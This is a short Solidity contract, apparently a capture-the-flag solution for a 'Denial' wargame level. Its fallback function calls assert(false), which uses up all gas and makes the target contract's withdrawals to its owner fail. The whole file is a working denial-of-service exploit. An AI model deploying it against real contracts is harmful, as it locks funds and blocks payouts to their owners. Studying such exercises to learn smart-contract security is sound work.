// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

/**
    @title HackDenial
    @notice By running out of gas in the fallback function called by Denial contract, we prohibit the owner from receiving any withdrawal.
*/

contract HackDenial {
    fallback() external payable {
        assert(false);
    }
}